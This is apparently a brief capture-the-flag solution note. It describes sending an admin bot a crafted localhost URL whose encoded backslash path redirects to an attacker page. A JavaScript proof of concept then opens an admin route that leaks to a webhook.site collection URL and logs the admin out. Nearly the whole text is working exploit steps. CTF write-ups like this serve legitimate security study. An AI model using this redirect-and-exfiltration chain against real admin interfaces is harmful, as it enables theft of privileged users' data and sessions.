Send to admin a page doing:

1. Send to admin: `http://localhost:3000/%5cterjanq.me%2fsolve-flag-service.html`

The poc does:

```js
open('http://localhost:3000/admin/%5cwebhook.site%2F98ab5671-4676-4061-b3fe-3334fee5c50e/', 'b');
open('http://localhost:3000/admin/logout', 'a');
```